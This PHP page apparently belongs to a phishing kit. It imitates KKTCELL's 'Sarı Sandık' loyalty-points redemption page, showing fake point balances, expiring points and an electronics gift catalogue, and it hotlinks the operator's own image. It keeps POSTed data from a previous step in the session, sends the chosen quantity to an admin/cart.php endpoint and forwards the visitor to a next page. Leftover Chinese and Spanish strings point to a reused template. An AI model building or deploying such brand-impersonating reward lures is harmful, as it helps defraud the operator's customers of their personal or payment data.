  <?php
    session_start();
    include('header-new.php');



    if (isset($_POST['submit'])) {
        $_SESSION['step1Data'] = $_POST;
    }

    $productList = [
        [
            'product_name' => "Oral-B Pro 3-3000 - elektrikli diş fırçası",
            'product_price' => '4075 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/p1.jpg'
        ],
        [
            'product_name' => "Skip Clean Çamaşır Deterjanı*3",
            'product_price' => '3750 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/p2.jpg'
        ],
        [
            'product_name' => "Philips 2000 İç Mekan Nemlendirici– 32 m²",
            'product_price' => '5,000 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/p3.jpg'
        ],
        [
            'product_name' => "Cep telefonu için kablosuz şarj istasyonu",
            'product_price' => '3150 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/p4.jpg'
        ],
        [
            'product_name' => "Apple HomePod(Rastgele renk)",
            'product_price' => '4820 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/alexa.png'
        ],
        [
            'product_name' => "SereneLife Otomatik Süpürme Robotu",
            'product_price' => '5120 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/dummy.png'
        ],
        [
            'product_name' => "Sony WF-1000XM5 - Bluetooth kablosuz kulaklık",
            'product_price' => '4,550 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/headphone.png'
        ],
        [
            'product_name' => "STAMOL Ev Kamerası 2K WiFi",
            'product_price' => '5,000 Puan',
            'price' => '5000',
            'product_qty' => 0,
            'product_image' => '/images/ip.png'
        ]
    ];

    ?>
  <style>
      .login-form {
          width: 26rem;
          height: 30rem;
      }

      .MTM-bg-light {
          background-color: #f8f8f8 !important;
      }

      @media (max-width: 575px) {
          bg-top {
              background-image: url(<?php echo $folder_path;?>/assets/images/new_background_mobile.png) !important;
              background-size: 100% 96px;
          }

          .bg-top .text-4xl {
              font-size: 26px;
              height: 28px;
              line-height: 28px;
              font-weight: 500;
          }

          .bg-top .m-7 {
              margin-top: 22px;
          }

          .bg-top img.h-auto {
              height: 28px;
              width: 37px;
              padding: 0;
              margin-right: 15px;
          }

          .d-sm-none {
              display: none !important;
          }

          .login-wrapper .shadow-lg {
              box-shadow: none !important;
              max-width: 325px;
              box-shadow: 0px 1px 3px #ccc !important;
              margin-top: 142px;
              margin-bottom: 25px;
              padding: 67px 20px 64px 20px;
          }

          .login-form .flex-col {
              padding: 0 !important;
              width: 100%;
          }

          .login-form {
              height: unset;
              width: 100%;
              box-shadow: none !important;
          }

          .switch-user {
              justify-content: space-between;
          }

          .switch-user .flex.items-center {
              margin: 0;
          }

          .sm-full {
              width: 100% !important;
          }

          .sm-text-center {
              text-align: center !important;
              justify-content: center;
              display: flex;
          }

          .border-gray-500 {
              border: 1px solid #999999 !important;
              outline: none;
              border-radius: 8px;
          }

          .bg-dark {
              background-color: #002EFF !important;
          }

          .bg-dark span {
              color: #ffffff !important;
          }

          .border-dark {
              border-color: #000000 !important;
          }

          .login-form .w-28 {
              width: 44%;
          }

          #header-widget {
              display: none !important;
          }

          .section-hero {
              margin-top: 50px !important;
          }

          .gtm_footer {
              display: none !important;
          }

          .MTM-bg-light {
              background-color: #f8f8f8 !important;
          }

          .MTM-main-header-basic {

              background-color: #1470d1;
          }

          .MTM-main-header {
              background-color: #1470d1;
              padding: 1px 0;
              box-shadow: 0 2px 4px 0 rgb(0 0 0 / 20%);
              position: sticky;
              top: 0px;
              left: 0;
              right: 0;
              z-index: 12;
          }

          .MTM-col-5 {
              flex: 0 0 41.66667%;
              max-width: 41.66667%;
          }

          .MTM-container,
          .MTM-container-fluid,
          .MTM-container-lg,
          .MTM-container-md,
          .MTM-container-sm,
          .MTM-container-xl {
              width: 100%;
              padding-right: 16px;
              padding-left: 16px;
              margin-right: auto;
              margin-left: auto;
              font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
              font-size: .8125rem;
              font-weight: 600;
              line-height: 1.5;
              color: #777;
              text-align: left;
          }

          .MTM-pt-3,
          .MTM-py-3 {
              padding-top: 1.5rem !important;
              padding-bottom: 1.5rem !important;
          }


          .MTM-row {
              position: relative;
          }

          .MTM-mb-3,
          .MTM-my-3 {
              margin-bottom: 1.5rem !important;
          }

          .MTM-d-none {
              display: none !important;
          }

          .MTM-row {
              display: flex;
              flex-wrap: wrap;
              margin-right: -16px;
              margin-left: -16px;
          }

          .MTM-col-12,
          .MTM-col-lg-2 {
              flex: 0 0 100%;
              max-width: 100%;
              position: relative;
              width: 100%;
              padding-right: 5px;
              padding-left: 5px;
          }

          .MTM-mb-4,
          .MTM-my-4 {
              margin-bottom: 12px !important;
          }

          .MTM-main-footer .MTM-footer-col {
              width: 100%;
              float: left;
              position: relative;
          }

          .MTM-h6 {
              float: left;
          }

          .MTM-main-footer #contactUs .MTM-h6,
          .MTM-main-footer #contactUs a {
              font-weight: 600;
              height: auto;
          }

          .MTM-main-footer #contactUs p {
              color: #757575;
              height: 50px;
              font-size: .8125rem;
          }

          .MTM-main-footer .MTM-footer-col .MTM-h6 {
              left: 0;
              display: inline-block;
              position: absolute;
          }

          .MTM-main-footer .MTM-footer-col a {
              left: 50%;
              display: inline-block;
              position: absolute;
          }

          .MTM-main-footer .MTM-h6,
          .MTM-main-footer a,
          .MTM-main-footer p {
              font-size: .875rem;
              margin-bottom: 0;
          }

          .MTM-main-footer #contactUs .MTM-h6,
          .MTM-main-footer #contactUs a {
              font-weight: 600;
              height: auto;
              color: #0071d1;

          }

          #contactUs a,
          a:hover {
              color: #0071d1;
          }

          .MTM-main-footer .MTM-footer-col a {
              left: 50%;
              display: inline-block;
              position: absolute;
          }

          :root .p_quantity {
              color: #777777 !important;
              font-weight: 700 !important;
              background-color: #e9e9e9;
              width: 115%;
              padding: 7px 20px;
              border-radius: 5px;
              text-align: left;
          }
      }

      .wrap {
          padding: 30px 30px;
      }

      @media(max-width: 767px) {
          .loader-wrap {
              display: flex;
              width: 100%;
              height: 100%;
              position: fixed;
              top: 0;
              left: 0;
              align-items: center;
              justify-content: center;
              z-index: 99999999999999;
              background: rgba(255, 255, 255, 1);
          }

          .loader-wrap .loading {
              display: flex;
              flex-direction: column;
              align-items: center;
          }

          .loader-wrap .loading img.china-mobile-logo-img {
              width: 200px;
          }

          .loader-wrap .loading img {
              width: 80px;
          }

          .box {
              background: #00614a;
              padding: 10px 20px;
              border-radius: 8px;
              display: flex;
              align-items: center;
              justify-content: center;
              margin-top: 10px;
          }

          .section_1 {
              width: 50%;
          }

          .section_2 {
              width: 50%;
          }

          .inner_box {
              display: flex;
              flex-direction: column;
          }

          .inner_box>span {
              color: #fff;
          }

          .inner_box>b {
              color: #fff;
          }

          .product_area {
              margin-top: 12px;
          }

          .product_area>b {
              color: red;
          }

          .product_list {
              display: grid;
              align-items: center;
              justify-content: center;
              text-align: center;
              grid-template-columns: auto auto;
          }

          .product_s {
              width: 85%;
              border: 1px solid #efefef;
              margin: 5px;
              padding: 12px;
              height: 280px;
              display: flex;
              flex-direction: column;
              align-items: center;
              /* justify-content: center; */
              justify-content: flex-end;
          }

          .product_s>p {
              margin-bottom: 5px;
              font-size: 12px;
              font-weight: 500;
          }

          .p_name {}

          .p_image {
              /* width: 100%; */
              max-height: 140px;
          }

          .p_cart {
              padding: 4px;
              background: #2870d3;
              color: #fff;
              border: 0px;
              width: 100%;
              border-radius: 12px;
          }

          .update_qty>input:focus {
              outline: none;
          }

          .update_qty>input:active {
              outline: none;
          }

          .update_qty>input {
              outline: none;
              border: 0px;
              width: 90px;
              text-align: center;
          }

          .update_qty {
              margin-bottom: 8px;
              border-radius: 8px;
              padding: 3px;
              display: flex;
              align-items: center;
              justify-content: center;
              border: 1px solid;
          }

          .next_page {
              padding: 12px;
              background: #00614a;
              color: #fff;
              border: 0px;
              width: 100%;
              border-radius: 100px;
          }
      }

      .wrap>b {
          color: red;
      }

      .p_quantity {
          color: blue !important;
          font-weight: 700 !important;

      }

      h2.title.text-satura.txt-center.t-b-12.remebre {
          font-size: 22px;
          font-weight: bold;
          line-height: 1.38;
          color: #000;
          text-align: center;
          margin-bottom: 20px;
          margin-top: 20px;
          margin-bottom: 10px;
      }
  </style>

  <div class="wrap">
      <div class="content">
          <img src="https://m.kktcell.com/assets/web/build/assets/images/content/global/sari-sandik/puan.png" width="100%">
          <h2 class="title text-satura txt-center t-b-12 remebre">Sarı Sandık Puan İşlemlerim</h2>
          <p>
              Sarı Sandık’daki puan kazanımlarınızı, puan harcamalarınızı, seçtiğiniz hediyeleri ve diğer detayları ‘Geçmiş İşlemlerim’den kolaylıkla takip edebilirsiniz.
          </p>
      </div>
      <b>
          <i class="fa fa-chevron-left"></i> Puanlar, kullanım tamamlandıktan sonra düşülecektir
      </b>
      <div class="box">
          <div class="section_1">
              <div class="inner_box">
                  <span>Mevcut puanlar</span>
                  <input type="hidden" id="totalValue" value="5000" />
                  <b>5340</b>
              </div>
          </div>
          <div class="section_2">
              <div class="inner_box">
                  <span>Süresi dolan puanlar</span>
                  <b>1030</b>
              </div>
          </div>
      </div>
      <div class="product_area">
          <b>
              Hediyeler
          </b>
          <div class="product_list">
              <input type="hidden" value="" id="totalPrice" />
              <?php foreach ($productList as $k => $products) { ?>
                  <div class="product_s">
                      <img class="p_image" src="<?php echo $folder_path;?><?php echo $products['product_image']  ?>" />
                      <p class="p_name"><?php echo $products['product_name'] ?></p>
                      <p class="p_quantity"><?php echo $products['product_price'] ?></p>
                      <input type="hidden" id="price<?php echo $k ?>" value="<?php echo $products['price'] ?>" />
                      <input type="hidden" id="final_price<?php echo $k ?>" value="" />
                      <div class="update_qty">
                          <i class="fa fa-plus" onclick="up(<?php echo $k ?>)">+</i>
                          <input type="number" disabled value="0" id="qty<?php echo $k ?>" />
                          <i class="fa fa-minus" onclick="down(<?php echo $k ?>)">-</i>
                      </div>
                      <!--                        <button class="p_cart">大車</button>-->
                  </div>
              <?php
                }
                ?>
          </div>
      </div>
      <br>
      <br>
      <div class="nextPage">
          <div id="progress-loading" style="display:none;text-align:center;"><img style="width:60px; height:auto;" src="../loading.gif" /></div>
          <button class="next_page" id="carBtn" onclick="goToNextPage()">ile devam et</button>
      </div>
  </div>



  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
      setTimeout(() => {
          jQuery('.loader-wrap').hide();
      }, 3000);
      let totalValue = Number($('#totalValue').val());
      let calculateValue = 0;
      let quantity = 0;

      function up(val) {
          let totalPrice = Number($('#totalPrice').val());
          if (calculateValue >= totalValue) {
              //alert('超出可用積分');
              console.log("value already exeeded");
          } else {
              let value = Number($('#qty' + val).val()) + 1;
              quantity = value;
              $('#qty' + val).val(value);
              let productPrice = Number($('#price' + val).val());
              let finalValue = productPrice * value;
              calculateValue = finalValue;
              console.log("totalPrice ===>", finalValue);
              $('#totalPrice').val(calculateValue);
              if (finalValue > totalValue) {
                  alert('Excedido los puntos de recompensa');
              }
          }
      }

      function down(val) {
          let value = Number($('#qty' + val).val()) - 1;
          quantity = value;
          let totalPrice = Number($('#totalPrice').val());
          if (value >= 0) {
              $('#qty' + val).val(value);
              let productPrice = Number($('#price' + val).val());
              console.log("productPrice ==>", productPrice);
              console.log("totalPrice ==>", totalPrice);
              let finalValue = calculateValue - productPrice;
              console.log("finalValue ===>", finalValue);
              calculateValue = finalValue;
              $('#totalPrice').val(finalValue);
          }
      }

      function goToNextPage() {
          let totalPrice = Number($('#totalPrice').val());
          console.log('totalPrice ===>', totalPrice);
          console.log('totalValue ===>', totalValue);
          console.log('quantity ===>', quantity);
          let formData = {
              total_quantity: quantity
          }
          $("#progress-loading").show();
          $('#carBtn').prop('disabled', true);
          $.ajax({
              url: "<?php echo $folder_path;?>/admin/cart.php",
              type: "POST",
              data: formData,
              success: function(response) {
                  $("#progress-loading").hide();
                  console.log("response ===>", response);
                  window.location.href = 'page3.php';
              },
              error: function(error) {
                  $("#progress-loading").hide();
                  $('#carBtn').prop('disabled', false);
                  console.log("error ===>", error);
              }
          });
          // if(calculateValue >= totalValue) {
          //     alert('超出可用積分');
          // } else {
          //     window.location.href='page3.php';
          // }
      }
  </script>
  <?php include('footer-new.php'); ?>